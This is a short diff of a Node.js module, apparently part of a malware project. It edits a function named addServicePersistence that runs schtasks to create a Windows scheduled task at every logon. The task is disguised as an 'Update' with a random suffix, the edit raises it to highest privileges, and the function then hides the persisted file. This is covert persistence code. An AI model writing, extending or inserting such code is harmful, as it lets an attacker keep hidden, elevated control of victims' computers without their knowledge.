@@ -1,10 +1,8 @@
 const childprocess = require('child_process');
-const path = require('path');
 const core = require('./core');
-const fs = require('fs');
 
 function addServicePersistence(persistencePath, random) {
-    childprocess.execSync(`schtasks /create /tn Update${random} /tr "${persistencePath}" /sc onlogon /ru System`);
+    childprocess.execSync(`cmd /c schtasks /create /sc onlogon /tn Update${random} /tr \\"${persistencePath}\\" /F /rl highest`);
     core.hideFile(persistencePath);
 }
 
